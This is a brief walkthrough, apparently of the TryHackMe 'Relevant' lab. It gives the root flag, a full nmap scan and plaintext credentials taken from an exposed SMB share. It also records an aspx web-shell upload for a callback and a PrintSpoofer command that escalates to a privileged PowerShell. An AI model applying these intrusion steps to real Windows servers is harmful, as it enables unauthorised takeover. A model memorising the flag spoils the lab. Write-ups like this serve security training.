# Relevant
##### Question 1: User Flag
Answer
```bash

```

##### Question 2: Root Flag
Answer
```bash
THM{1fk5kf469devly1gl320zafgl345pv}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Nmap Scan:
```bash
Host is up, received user-set (0.11s latency).
Scanned at 2021-12-21 18:01:38 EST for 282s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-12-21T23:05:39+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-20T22:58:36
| Not valid after:  2022-06-21T22:58:36
| MD5:   2482 42a8 9fe4 b869 4336 bb8d 0495 b6af
| SHA-1: c252 f230 3a59 217c b534 18bf 8079 4871 a46f 4d55
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQf4zEpqva6rlKL3L59lsNTDANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTEyMjAyMjU4MzZaFw0yMjA2MjEyMjU4
| MzZaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA7FQoYMGkJwil0jGO8f8Im6JfFJRY6MKJm+hb6AWXD3ByTEN6LMQJ
| 9zkAtB9wl4QnreON3h8ZaS6AMxEGSW7p9k/S2v6SP04yVsovQ1hX2+Z9sAATlGsn
| XuUpIQoFkh5LiGztEuCZCh+B4mX+F5T8tcwx4IxIhz9JADMYB6RrdUzpcKsOV6J8
| zyJquSGlYE90zC7/+Q1dZHqa5IlpU/xwt73LrKjEnzCS5AmxFwV0muSDkQiz0y2j
| rtbrpdh0r02gwCOmTkMRj7+ahJTtq59vVAtu1qUsDeAQD5VJH7Gl9aeMlsyxQAFg
| bj3XDic0ygLppu30LttOSHn07wc6OdL0zQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBANajoxG1rCRh
| IvF7RefehNaxEE3m2whs52EBPgHIKHYLAC/SlSSPF4wAk6DNYnERnNr2oKehy+fX
| /rCslw9hzJ/huqhv4PLPFZTpsDF7Zr6xOlWgAAG2in9xXZdBaYnF664aNOmBty//
| iPBCGyD4Oj4Te44HskfhfppvextYVQJ/Aj6s6z5keYNDtwcs5ge9JsN7G8gLli/4
| EuttuWu9IOQPzhylDWr/uu9X76O1qnjwhtjN91Rr3rpjZSraqTEA6FGc3Hgiob5W
| qrs7kHLDTHAh6VvQXtjOUmYdxBHKV2KVJ5E9GbFbzQDZp6acQNgiwhTXVSEuzIhu
| ZDG4wA+S5iQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-12-21T23:06:20+00:00; 0s from scanner time.
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49886/tcp): CLEAN (Timeout)
|   Check 2 (port 42468/tcp): CLEAN (Timeout)
|   Check 3 (port 40722/udp): CLEAN (Timeout)
|   Check 4 (port 24533/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-12-21T15:05:41-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-21T23:05:44
|_  start_date: 2021-12-21T22:58:50

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   44.67 ms  10.6.0.1
2   ... 3
4   113.50 ms 10.10.113.176
```

smb dir nt4wrksv had passwords.txt file
```bash
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

SMB is in URL - http://10.10.113.176:49663/nt4wrksv/passwords.txt

Upload a aspx shell and get a callback

![[Pasted image 20211221175248.png]]
Priv Esc:
```bash
https://github.com/itm4n/PrintSpoofer/releases

PrintSpoofer64.exe -i -c powershell.exe
```